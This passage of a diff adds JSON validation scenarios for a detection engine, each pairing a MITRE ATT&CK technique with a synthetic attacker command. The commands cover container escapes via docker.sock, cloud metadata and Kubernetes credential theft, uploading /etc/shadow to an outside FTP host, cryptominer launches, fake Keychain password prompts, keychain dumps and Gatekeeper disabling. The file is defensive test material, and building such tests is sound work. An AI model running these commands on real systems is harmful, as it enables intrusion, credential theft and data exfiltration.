+   "description": "Independent validation scenario for T1611, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1611"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl --unix-socket /var/run/docker.sock -H Content-Type:application/json -X POST -d {\"Image\":\"alpine\",\"Cmd\":[\"sh\"],\"Binds\":[\"/:/host\"]} http:/v1.41/containers/create",
+     "parent_exe": "/bin/sh"
+    }
+   ],
+   "expect": [
+    "T1611"
+   ]
+  },
+  {
+   "id": "val3-t1611-cgroup-escape",
+   "name": "cgroup v1 notify_on_release escape",
+   "description": "Independent validation scenario for T1611, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1611"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && echo 1 > /tmp/cgrp/x/notify_on_release",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1611"
+   ]
+  },
+  {
+   "id": "val3-t1611-core-pattern",
+   "name": "core_pattern pipe handler",
+   "description": "Independent validation scenario for T1611, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1611"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c echo \"|/tmp/payload\" > /proc/sys/kernel/core_pattern",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1611"
+   ]
+  },
+  {
+   "id": "val3-t1611-sock-mount",
+   "name": "docker.sock mounted into a docker CLI container",
+   "description": "Independent validation scenario for T1611, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1611"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/docker",
+     "command": "docker run -v /var/run/docker.sock:/var/run/docker.sock -it docker sh",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1611"
+   ]
+  },
+  {
+   "id": "val3-t1611-chroot-host",
+   "name": "chroot into a host mount",
+   "description": "Independent validation scenario for T1611, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1611"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/chroot",
+     "command": "chroot /host /bin/bash",
+     "parent_exe": "/bin/sh"
+    }
+   ],
+   "expect": [
+    "T1611"
+   ]
+  },
+  {
+   "id": "val3-t1611-unshare-ur",
+   "name": "unshare -Ur namespaces",
+   "description": "Independent validation scenario for T1611, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1611"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/unshare",
+     "command": "unshare -Ur sh",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1611"
+   ]
+  },
+  {
+   "id": "val3-t1611-ctr-privileged",
+   "name": "containerd ctr privileged run",
+   "description": "Independent validation scenario for T1611, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1611"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/ctr",
+     "command": "ctr run --privileged --rm -t docker.io/library/alpine:latest x sh",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1611"
+   ]
+  },
+  {
+   "id": "val3-t1610-remote-docker",
+   "name": "Remote docker daemon on 2375",
+   "description": "Independent validation scenario for T1610, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1610"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/docker",
+     "command": "docker -H tcp://203.0.113.50:2375 run -d --net host alpine",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1610"
+   ]
+  },
+  {
+   "id": "val3-t1610-kubectl-apply-url",
+   "name": "kubectl apply of a remote manifest",
+   "description": "Independent validation scenario for T1610, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1610"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/kubectl",
+     "command": "kubectl apply -f https://raw.githubusercontent.com/x/y/main/ds-priv.yaml",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1610"
+   ]
+  },
+  {
+   "id": "val3-t1609-kubectl-exec-apiserver",
+   "name": "Shell in the apiserver static pod",
+   "description": "Independent validation scenario for T1609, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1609"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/kubectl",
+     "command": "kubectl exec -it kube-apiserver-master -n kube-system -- sh",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1609"
+   ]
+  },
+  {
+   "id": "val3-t1609-kubelet-run",
+   "name": "Command via the kubelet run endpoint",
+   "description": "Independent validation scenario for T1609, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1609"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl -k https://10.0.1.12:10250/run/prod/api-0/app -d cmd=id",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1609"
+   ]
+  },
+  {
+   "id": "val3-t1552-007-get-secrets-json",
+   "name": "All cluster secrets exported as json",
+   "description": "Independent validation scenario for T1552.007, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.007"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/kubectl",
+     "command": "kubectl get secrets --all-namespaces -o json > /tmp/s.json",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1552.007"
+   ]
+  },
+  {
+   "id": "val3-t1552-007-sa-token",
+   "name": "Service account token read",
+   "description": "Independent validation scenario for T1552.007, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.007"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/cat",
+     "command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1552.007"
+   ]
+  },
+  {
+   "id": "val3-t1552-007-etcd-secret",
+   "name": "Single secret read straight from etcd",
+   "description": "Independent validation scenario for T1552.007, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.007"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/etcdctl",
+     "command": "etcdctl --endpoints=https://127.0.0.1:2379 get /registry/secrets/default/db-creds",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1552.007"
+   ]
+  },
+  {
+   "id": "val3-t1613-can-i-list",
+   "name": "RBAC probing",
+   "description": "Independent validation scenario for T1613, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1613"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/kubectl",
+     "command": "kubectl auth can-i --list",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1613"
+   ]
+  },
+  {
+   "id": "val3-t1613-deepce",
+   "name": "Docker enumeration script",
+   "description": "Independent validation scenario for T1613, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1613"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/tmp/deepce.sh",
+     "command": "./deepce.sh",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1613"
+   ]
+  },
+  {
+   "id": "val3-t1613-cdk",
+   "name": "cdk evaluate",
+   "description": "Independent validation scenario for T1613, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1613"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/tmp/cdk",
+     "command": "./cdk evaluate",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1613"
+   ]
+  },
+  {
+   "id": "val3-t1552-005-imds-iam",
+   "name": "IMDS role listing",
+   "description": "Independent validation scenario for T1552.005, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1552.005"
+   ]
+  },
+  {
+   "id": "val3-t1552-005-gcp-token",
+   "name": "GCP metadata token with wget",
+   "description": "Independent validation scenario for T1552.005, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/wget",
+     "command": "wget -qO- --header=Metadata-Flavor:Google http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1552.005"
+   ]
+  },
+  {
+   "id": "val3-t1552-005-imds-net",
+   "name": "Connection to IMDS",
+   "description": "Independent validation scenario for T1552.005, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "network",
+     "destination": "169.254.169.254:80"
+    }
+   ],
+   "expect": [
+    "T1552.005"
+   ]
+  },
+  {
+   "id": "val3-t1552-005-imds-v2-token",
+   "name": "IMDSv2 token request then role fetch",
+   "description": "Independent validation scenario for T1552.005, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1552.005"
+   ]
+  },
+  {
+   "id": "val3-t1496-xmrig-bin",
+   "name": "xmrig run from /tmp",
+   "description": "Independent validation scenario for T1496, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1496"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/tmp/xmrig-6.21.0/xmrig",
+     "command": "./xmrig -o pool.hashvault.pro:443 -u 49x -p x --tls",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1496"
+   ]
+  },
+  {
+   "id": "val3-t1496-pool-dns",
+   "name": "Mining pool lookup",
+   "description": "Independent validation scenario for T1496, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1496"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "dns",
+     "query": "gulf.moneroocean.stream",
+     "qtype": "A"
+    }
+   ],
+   "expect": [
+    "T1496"
+   ]
+  },
+  {
+   "id": "val3-t1496-pool-net",
+   "name": "Mining pool connect",
+   "description": "Independent validation scenario for T1496, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1496"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "network",
+     "destination": "xmr-us-east1.nanopool.org:14444"
+    }
+   ],
+   "expect": [
+    "T1496"
+   ]
+  },
+  {
+   "id": "val3-t1496-docker-miner",
+   "name": "Miner container started",
+   "description": "Independent validation scenario for T1496, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1496"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/docker",
+     "command": "docker run -d --name m metal3d/xmrig",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1496"
+   ]
+  },
+  {
+   "id": "val3-t1496-rx-flags",
+   "name": "Renamed miner with algorithm flags",
+   "description": "Independent validation scenario for T1496, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1496"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/nohup",
+     "command": "nohup ./kworker -a rx/0 -o 198.51.100.77:3333 -u w -p x &",
+     "parent_exe": "/bin/sh"
+    }
+   ],
+   "expect": [
+    "T1496"
+   ]
+  },
+  {
+   "id": "val3-t1048-upload-shadow",
+   "name": "shadow uploaded with curl -T",
+   "description": "Independent validation scenario for T1048, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1048"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl -T /etc/shadow ftp://203.0.113.5/in/",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1048"
+   ]
+  },
+  {
+   "id": "val3-t1560-001-tar-shm",
+   "name": "Secrets staged to shm",
+   "description": "Independent validation scenario for T1560.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Collection"
+   ],
+   "techniques": [
+    "T1560.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/tar",
+     "command": "tar -czf /dev/shm/h.tgz /home/ops/.ssh /etc/shadow",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1560.001"
+   ]
+  },
+  {
+   "id": "val3-t1543-001-launchagent-file",
+   "name": "Fake Keystone LaunchAgent",
+   "description": "Independent validation scenario for T1543.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1543.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/Users/ann/Library/LaunchAgents/com.google.keystone.agent.plist",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1543.001"
+   ]
+  },
+  {
+   "id": "val3-t1543-001-bootstrap-tmp",
+   "name": "launchd bootstrap from /tmp",
+   "description": "Independent validation scenario for T1543.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1543.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/launchctl",
+     "command": "launchctl bootstrap system /tmp/x.plist",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1543.001"
+   ]
+  },
+  {
+   "id": "val3-t1037-002-logouthook",
+   "name": "Logout hook",
+   "description": "Independent validation scenario for T1037.002, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1037.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/defaults",
+     "command": "defaults write com.apple.loginwindow LogoutHook /Library/Scripts/.h.sh",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1037.002"
+   ]
+  },
+  {
+   "id": "val3-t1546-014-emond",
+   "name": "emond rule drop",
+   "description": "Independent validation scenario for T1546.014, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1546.014"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/private/etc/emond.d/rules/x.plist",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1546.014"
+   ]
+  },
+  {
+   "id": "val3-t1547-015-login-item",
+   "name": "Hidden login item via System Events",
+   "description": "Independent validation scenario for T1547.015, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1547.015"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/osascript",
+     "command": "osascript -e tell application \"System Events\" to make new login item at end with properties {name:\"Helper\", path:\"/Users/Shared/h\", hidden:true}",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1547.015"
+   ]
+  },
+  {
+   "id": "val3-t1059-002-jxa-nstask",
+   "name": "JXA with NSTask",
+   "description": "Independent validation scenario for T1059.002, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1059.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/osascript",
+     "command": "osascript -l JavaScript -e ObjC.import('Foundation'); var t=$.NSTask.alloc.init;",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1059.002"
+   ]
+  },
+  {
+   "id": "val3-t1056-002-keychain-phish",
+   "name": "Fake Keychain dialog",
+   "description": "Independent validation scenario for T1056.002, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1056.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/osascript",
+     "command": "osascript -e display dialog \"Keychain Access wants to use the login keychain. Enter your password.\" default answer \"\" with hidden answer",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1056.002"
+   ]
+  },
+  {
+   "id": "val3-t1548-004-admin-shell",
+   "name": "do shell script with administrator privileges",
+   "description": "Independent validation scenario for T1548.004, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1548.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/osascript",
+     "command": "osascript -e do shell script \"chmod +s /tmp/x\" with administrator privileges",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1548.004"
+   ]
+  },
+  {
+   "id": "val3-t1555-001-dump",
+   "name": "Keychain dump",
+   "description": "Independent validation scenario for T1555.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1555.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/security",
+     "command": "security dump-keychain -d /Users/ann/Library/Keychains/login.keychain-db",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1555.001"
+   ]
+  },
+  {
+   "id": "val3-t1555-001-slack-safe",
+   "name": "Safe Storage secret request",
+   "description": "Independent validation scenario for T1555.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1555.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/security",
+     "command": "security find-generic-password -ga Slack Safe Storage",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1555.001"
+   ]
+  },
+  {
+   "id": "val3-t1555-001-internet-pw",
+   "name": "Internet password lookup",
+   "description": "Independent validation scenario for T1555.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1555.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/security",
+     "command": "security find-internet-password -ga github.com",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1555.001"
+   ]
+  },
+  {
+   "id": "val3-t1003-plutil-hash",
+   "name": "Hash plist converted with plutil",
+   "description": "Independent validation scenario for T1003, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/plutil",
+     "command": "plutil -convert xml1 -o - /var/db/dslocal/nodes/Default/users/admin.plist",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1003"
+   ]
+  },
+  {
+   "id": "val3-t1110-001-authonly",
+   "name": "dscl authonly guess",
+   "description": "Independent validation scenario for T1110.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1110.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/dscl",
+     "command": "dscl /Local/Default -authonly bob Password1",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1110.001"
+   ]
+  },
+  {
+   "id": "val3-t1548-006-tcc-insert",
+   "name": "TCC grant via sqlite",
+   "description": "Independent validation scenario for T1548.006, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1548.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/sqlite3",
+     "command": "sqlite3 /Users/ann/Library/Application Support/com.apple.TCC/TCC.db INSERT OR IGNORE INTO access VALUES('kTCCServiceScreenCapture','com.x.app',0,2,4,1,NULL,NULL,0,NULL,NULL,0,0)",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1548.006"
+   ]
+  },
+  {
+   "id": "val3-t1548-006-tcc-file",
+   "name": "TCC db modified",
+   "description": "Independent validation scenario for T1548.006, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1548.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/Library/Application Support/com.apple.TCC/TCC.db",
+     "operation": "modify"
+    }
+   ],
+   "expect": [
+    "T1548.006"
+   ]
+  },
+  {
+   "id": "val3-t1553-001-xattr-rd",
+   "name": "Quarantine removed from a download",
+   "description": "Independent validation scenario for T1553.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1553.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/xattr",
+     "command": "xattr -rd com.apple.quarantine /Users/ann/Downloads/Setup.app",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1553.001"
+   ]
+  },
+  {
+   "id": "val3-t1553-001-xattr-c-shared",
+   "name": "Attributes cleared in Shared",
+   "description": "Independent validation scenario for T1553.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1553.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/xattr",
+     "command": "xattr -c /Users/Shared/x.dmg",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1553.001"
+   ]
+  },
+  {
+   "id": "val3-t1553-001-master-disable",
+   "name": "Gatekeeper master disable",
+   "description": "Independent validation scenario for T1553.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1553.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/spctl",
+     "command": "spctl --master-disable",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1553.001"
+   ]
+  },
+  {
+   "id": "val3-t1553-004-burp-cert",
+   "name": "Interception CA trusted",
+   "description": "Independent validation scenario for T1553.004, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1553.004"
+   ],
+   "benign": false,
